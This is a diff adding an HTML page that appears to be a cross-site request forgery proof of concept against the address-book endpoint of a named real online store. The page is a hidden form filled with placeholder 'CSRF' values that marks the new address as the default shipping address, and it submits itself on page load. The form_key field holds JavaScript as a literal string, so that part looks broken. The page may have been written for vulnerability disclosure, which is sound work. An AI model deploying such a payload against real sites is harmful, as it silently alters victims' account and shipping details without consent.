@@ -1,0 +1,23 @@
+<html><body>
+  <form name="csrf_form" action="https://mynintendostore.nintendo.pt/customer/address/formPost/" method="POST">
+    <input type="hidden" name="form_key" value="document.location.hash.replace('#','')">
+    <input type="hidden" name="success_url" value="">
+    <input type="hidden" name="error_url" value="">
+    <input type="hidden" name="firstname" value="CSRF">
+    <input type="hidden" name="lastname" value="CSRF">
+    <input type="hidden" name="telephone" value="">
+    <input type="hidden" name="street[0]" value="CSRF">
+    <input type="hidden" name="street[1]" value="23">
+    <input type="hidden" name="street[2]" value="CSRF">
+    <input type="hidden" name="postcode" value="39600000">
+    <input type="hidden" name="country_id" value="PT">
+    <input type="hidden" name="state" value="CSRF">
+    <input type="hidden" name="city" value="CSRF">
+    <input type="hidden" name="default_shipping" value="1">
+    <input type="hidden" name="default_billing" value="0">
+    <input type="hidden" name="region" value="">
+    <input type="hidden" name="region_id" value="0">
+  </form>
+
+  <script type="text/javascript">document.csrf_form.submit();</script>
+</body></html>
